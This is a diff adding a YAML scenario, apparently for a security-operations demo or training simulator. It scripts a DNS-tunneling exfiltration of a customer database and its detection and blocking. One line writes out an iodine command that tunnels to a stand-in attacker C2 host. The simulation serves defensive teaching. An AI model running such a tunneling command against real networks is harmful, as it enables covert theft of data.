@@ -1,0 +1,99 @@
+id: exfiltration
+name: Data exfiltration
+technique_id: T1048
+target_host: switch
+target_ip: 10.0.0.2
+description: Encrypted DNS tunneling over UDP port 53 to circumvent perimeter controls
+lines:
+  - text: "[*] target: switch 10.0.0.2 & DMZ Gateway"
+    type: info
+    delay: 0.6
+    kill_chain_stage: Recon
+  - text: "[*] staging exfiltration bundle: customer_vault.db (42 MB compressed)"
+    type: info
+    delay: 0.8
+    kill_chain_stage: Initial access
+  - text: "[*] establishing encrypted DNS tunnel to c2.attacker-domain.org"
+    type: info
+    delay: 1.0
+    kill_chain_stage: Execution
+    event:
+      technique_id: T1071
+      technique_name: Application Layer Protocol
+      event: "dns tunnel initiated from 10.0.2.31 to c2.attacker-domain.org"
+      source_ip: 10.0.2.31
+      target_host: switch
+      state: DETECTED
+      severity: MEDIUM
+      module: Watch
+      breach: false
+  - text: "[*] iodine -f -P s3cr3t c2.attacker-domain.org 10.0.0.2"
+    type: info
+    delay: 0.8
+    kill_chain_stage: Execution
+  - text: "[+] DNS TXT record tunneling interface established (tun0: 10.99.99.1)"
+    type: success
+    delay: 0.9
+    kill_chain_stage: Priv esc
+  - text: "[*] streaming base64 encoded data packets over port 53 UDP"
+    type: info
+    delay: 1.0
+    kill_chain_stage: Lateral
+    event:
+      technique_id: T1048
+      technique_name: Exfiltration Over Alternative Protocol
+      event: "data exfiltration over DNS tunnel payload stream"
+      source_ip: 10.0.2.31
+      target_host: switch
+      state: ALERT
+      severity: CRITICAL
+      module: Watch
+      breach: true
+    host_update:
+      host: switch
+      status: suspicious
+      last_alert: "T1048 dns exfil"
+  - text: "[!] Zeek IDS: anomalous DNS query frequency detected (120 req/sec)"
+    type: alert
+    delay: 0.8
+    kill_chain_stage: Lateral
+  - text: "[!] SIEM rule fired: T1071 DNS Tunneling Data Exfiltration"
+    type: alert
+    delay: 0.9
+    kill_chain_stage: Impact
+    event:
+      technique_id: T1071
+      technique_name: Application Layer Protocol
+      event: "SIEM rule fired: High entropy DNS queries"
+      source_ip: 10.0.2.31
+      target_host: switch
+      state: ALERT
+      severity: HIGH
+      module: Watch
+      breach: false
+  - text: "[+] Suricata NIDS: high-entropy DNS payload detected on VLAN trunk"
+    type: success
+    delay: 0.8
+    kill_chain_stage: Impact
+  - text: "[+] Reflex SOAR: DNS sinkhole policy deployed to pfSense DNS resolver"
+    type: success
+    delay: 1.1
+    kill_chain_stage: Impact
+    event:
+      technique_id: T1048
+      technique_name: Exfiltration Over Alternative Protocol
+      event: "Reflex DNS sinkhole applied: c2.attacker-domain.org"
+      source_ip: 10.0.2.31
+      target_host: pfsense
+      state: BLOCKED
+      severity: HIGH
+      module: Reflex
+      breach: false
+  - text: "[!] DNS tunnel collapsed: NXDOMAIN returned for all C2 queries"
+    type: alert
+    delay: 0.7
+    kill_chain_stage: Impact
+  - text: "[*] exfiltration aborted: 0 bytes transferred outside isolated range"
+    type: info
+    delay: 0.6
+    kill_chain_stage: Impact
